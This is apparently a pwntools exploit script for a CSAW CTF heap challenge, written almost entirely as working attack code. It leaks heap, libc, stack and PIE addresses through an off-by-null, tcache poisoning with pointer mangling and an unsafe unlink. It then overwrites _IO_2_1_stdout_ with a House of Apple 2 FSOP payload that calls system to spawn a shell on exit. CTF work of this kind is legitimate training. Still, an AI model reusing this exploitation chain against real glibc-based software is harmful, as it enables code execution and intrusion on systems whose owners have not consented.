from pwn import *

# CREDIT: https://github.com/RoderickChan/pwncli/tree/main
import io_file

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chal_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

serv = "chals.ctf.csaw.io"
port = 21003

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()


def malloc(index: int, size: int, data: bytes):
    sla(b'\x9c\xa7  ', b'1')
    sla(b'*)  ', sen(index))
    sla(b'o) ', sen(size))
    if data: sna(b'\x99\xa1  ', data)

def copy(dest_index: int, src_index: int, len: int):
    sla(b'\x9c\xa7  ', b'2')
    sla(b'\x92)  ', sen(dest_index))
    sla(b'\x90)  ', sen(src_index))
    sla(b'\xbc)  ', sen(len))

def free(index: int):
    sla(b'\x9c\xa7  ', b'3')
    sla(b'\xb4)  ', sen(index))

def read():
    sla(b'\x9c\xa7  ', b'4')
    rcu(b'\xa0)  ')
    return r.recv(0x100)

def main():

    # heap leak
    malloc(0, 0x47, b'Z'*0x47)
    free(0)
    heap_base = u64(read()[:8].ljust(8, b'\x00')) << 12
    log.info(f"{hex(heap_base)=}")
    
    # Fake chunk header to consolidate into
    malloc(0, 0x47, b''.join([
        p64(0), # prev_size of forged chunk
        p64(0x10a0), # size
        p64(heap_base + 0x290 + 0x10), # fd
        p64(heap_base + 0x290 + 0x10), # bk
        b'\x00' * 0x27
    ]))

    # Create some buffer chunks so that the stupid malloc() is not called after free
    malloc(15, 0xc7, b'D'*0xc7)
    for i in range(1, 5):
        malloc(i, 0x100, b'B'*0x100)
    for i in range(1, 5):
        free(i)
    for i in range(1, 5):
        malloc(i, 0xd7, b'D'*0xd7)
    for i in range(1, 5):
        free(i)
    for i in range(1, 7):
        malloc(i, 0xc7, b'E'*0xc7)
    malloc(13, 0xc7, b'E'*0xc7)
    malloc(12, 0xc7, b'E'*0xc7)
    malloc(11, 0xc7, b'E'*0xc7)
    for i in range(1, 7):
        free(i)
    free(15)

    # Chunk for off-by-null, chunk that will consolidate up & barrier chunk
    malloc(1, 0x77, b'E' * 0x77)
    malloc(2, 0xf7, b'F' * 0xf7)

    # Off-by-null and setup correct prev_size of forged chunk
    free(1)
    malloc(1, 0x78, b''.join([
        p64(0) * 14,
        p64(0x10a0) # Forged prev_size
    ])) # Off-by-null occurs due to the program
    
    # Fill tcache (size 0x100)
    for i in range(3, 10):
        malloc(i, 0xf7, b'G' * 0xf7)
    for i in range(3, 10):
        free(i)

    # Free chunk that will consolidate up
    free(2)

    # libc leak
    libc.address = u64(read()[0x10:0x18].ljust(8, b'\x00')) - 0x203b20
    log.info(f"{hex(libc.address)=}")

    # TCACHE POISON FOR STACK LEAK
    malloc(3, 0xb8, b''.join([
        b'R' * 0x38, 
        p64(0xd1),
        p64(mangle(libc.address + 0x2046e0, heap_base)),
        p64(0) * 14
    ]))
    malloc(4, 0xc7, b'R' * 0xc7)
    malloc(5, 0xc7, None)
    free(4)
    stack_leak = mangle(mangle(u64(read()[0x50:0x58].ljust(8, b'\x00')), heap_base), libc.address + 0x2046e0) - 0xd8
    log.info(f"{hex(stack_leak)=}")

    # TCACHE POISON FOR PIE LEAK
    free(3)
    malloc(3, 0xb8, b''.join([
        b'R' * 0x38, 
        p64(0xd1),
        p64(mangle(stack_leak, heap_base)),
        p64(0) * 14
    ]))
    malloc(4, 0xc7, b'R' * 0xc7)
    malloc(5, 0xc7, None)
    free(4)
    pie_leak = mangle(mangle(u64(read()[0x50:0x58].ljust(8, b'\x00')), heap_base), stack_leak) + 0x308
    log.info(f"{hex(pie_leak)=}")

    # Unsafe unlink
    malloc(10, 0xc7, b''.join([ # Reassert the unsorted bin position
        b'R' * 0x78,
        p64(0x10e1),
        p64(libc.address + 0x203b20) * 2,   
        p64(0) * 6 + b'\x00' * 7
    ]))
    malloc(9, 0xd0, b'F' * 0xd0)
    free(3)
    malloc(8, 0xb7, b''.join([
        b'A' * 8,
        # Forged chunk
        p64(0x31), # size
        p64(pie_leak + 0x40 - 3 * 0x8), # fd
        p64(pie_leak + 0x40 - 2 * 0x8), # bk
        p64(0x0), # fd_nextsize
        b'B' * 8,

        p64(0x30), # prev_size
        p64(0xd0), # size
        b'C' * 0x77
    ]))
    free(13)
    free(12)
    free(11)
    free(10)

    # Finnagling with the heap chunk array
    malloc(5, 0xe0, b'H' * 0xe0)
    malloc(2, 0x17, p64(pie_leak + 0x50) + b'\x00' * 0xf)
    copy(8, 2, 6)
    free(2)

    # Use the pre-made House of Apple 2 to FSOP on exit into a shell
    file = io_file.IO_FILE_plus_struct()
    payload = file.house_of_apple2_execmd_when_exit(
            libc.sym["_IO_2_1_stdout_"],
            libc.sym["_IO_wfile_jumps"],
            libc.sym["system"])
    log.info(payload)
    malloc(7, len(payload), payload)

    malloc(10, 0xe0, b'H' * 0xe0)
    malloc(2, 0x17, p64(heap_base + 0x480) + b'\x00' * 0xf)
    copy(5, 2, 6)
    free(2)
    malloc(2, 0x17, p64(libc.sym["_IO_2_1_stdout_"]) + b'\x00' * 0xf)
    copy(8, 2, 6)

    # Overwrite _IO_2_1_stdout_
    copy(5, 10, 0xe0)

    # # Exit to win
    # sla(b'\x9c\xa7  ', b'-1')

    r.interactive()

if __name__ == "__main__":
    main()